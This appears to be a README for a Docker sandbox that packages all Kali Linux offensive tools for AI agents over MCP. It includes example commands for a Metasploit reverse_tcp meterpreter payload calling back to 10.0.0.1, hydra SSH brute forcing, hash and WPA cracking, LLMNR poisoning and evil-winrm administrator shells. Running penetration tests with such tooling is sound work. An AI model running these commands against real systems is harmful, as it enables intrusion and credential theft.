# Full Kali Arsenal for OPERATIONSPECTRE

## What's Included

The Dockerfile includes ALL Kali Linux security tools (full Kali image)
on top of the standard OPERATIONSPECTRE sandbox.

## MCP Integration

All tools are accessible through both:

### CLI Mode (Traditional)
```bash
opspectre shell "nmap -sV target.com"
opspectre file read /workspace/output/results.txt
```

### MCP Mode (AI Agents)
```python
nmap_scan(target="target.com")
file_read(path="/workspace/output/results.txt")
```

The MCP server provides structured JSON responses and better integration with AI agents while maintaining full access to all Kali tools.

### Kali Metapackages
- **kali-tools-web** - All web testing tools
- **kali-tools-passwords** - All password cracking tools
- **kali-tools-wireless** - All wireless attack tools
- **kali-tools-exploitation** - All exploitation tools
- **kali-tools-social-engineering** - All social engineering tools
- **kali-tools-post-exploitation** - All post-exploitation tools
- **kali-tools-information-gathering** - All recon tools
- **kali-tools-vulnerability** - All vulnerability scanners
- **kali-tools-reverse-engineering** - All RE tools
- **kali-tools-forensics** - All forensics tools
- **kali-tools-sniffing-spoofing** - All network sniffing tools

### Individual Security Tools
- **metasploit** - Full exploitation framework with PostgreSQL database
- **burpsuite** - Web application security testing (Community Edition)
- **hydra** - Brute force authentication cracker
- **john** - John the Ripper password cracker
- **hashcat** - GPU-accelerated password cracker
- **aircrack-ng** - WiFi security auditing suite
- **gobuster** - Directory/DNS/VHost busting tool
- **dirb** - Web content scanner
- **nikto** - Web server vulnerability scanner
- **responder** - LLMNR/NBT-NS/MDNS poisoner
- **enum4linux** - Linux/Samba enumeration tool
- **crackmapexec** - Network pentesting tool
- **evil-winrm** - Windows Remote Management shell

### Estimated Image Size
- Standard container (`Dockerfile`): ~14.8GB
- Full container (`Dockerfile`): ~22-25GB

## Architecture
```
opspectre CLI → Docker Runtime → Tool Server → Shell Command → Tool Execution
```

## Example Commands

### Metasploit
```bash
# Non-interactive exploitation
msf-run "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 10.0.0.1; exploit"

# Generate payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 -f exe > payload.exe

# Search for exploits
searchsploit apache 2.4.49
```

### Burp Suite
```bash
# GUI mode (via VNC)
burpsuite
```

### Password Cracking
```bash
# SSH brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.1 ssh

# Crack NTLM hashes
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### Wireless Attacks
```bash
# Crack WPA handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap

# Automated wireless attack
wifite --kill
```

### Post-Exploitation
```bash
# LLMNR poisoning
responder -I eth0 -wrf

# Network enumeration
crackmapexec smb 192.168.1.0/24 -u user -p password

# Windows shell
evil-winrm -i 192.168.1.1 -u administrator -p password
```

## Files

| File | Purpose |
|------|---------|
| `containers/Dockerfile` | Full Kali image with all tools |
| `containers/docker-compose.yml` | Compose config for full container |
| `containers/docker-entrypoint.sh` | Container startup script |
| `containers/wrappers/` | Tool wrapper scripts |
| `scripts/test-full-arsenal.sh` | Test script to verify installation |

## How to Build and Use

### 1. Build the container
```bash
cd containers
docker build -t opspectre-full:latest .
```

### 2. Start via compose
```bash
cd containers
docker compose up -d
```

### 3. Test the installation
```bash
docker exec opspectre-full bash /scripts/test-full-arsenal.sh
```

### 4. Start using the tools
```bash
opspectre sandbox start
opspectre shell "msfconsole -x version"
```

## Important Notes

1. **PostgreSQL**: Automatically starts for Metasploit via docker-entrypoint.sh
2. **Capabilities**: Container has NET_ADMIN and NET_RAW for network tools
3. **GPU**: Hashcat will use CPU unless you configure GPU passthrough
4. **VNC**: GUI tools (Burp Suite) accessible via VNC on port 5900
5. **Timeouts**: Long operations may need increased timeout:
   ```python
   runtime.execute("hashcat -m 1000 hashes.txt wordlist.txt", timeout=3600)
   ```

## Troubleshooting

### Metasploit database not connecting
```bash
sudo service postgresql restart
msfdb reinit
```

### Burp Suite GUI not opening
Ensure VNC is running:
```bash
Xvfb :99 -screen 0 1024x768x16 &
x11vnc -display :99 -forever -nopw -listen 0.0.0.0 -rfbport 5900 &
```

### Hashcat GPU issues
For CPU-only mode:
```bash
hashcat -D 1 -m 1000 hashes.txt wordlist.txt  # Force CPU
```
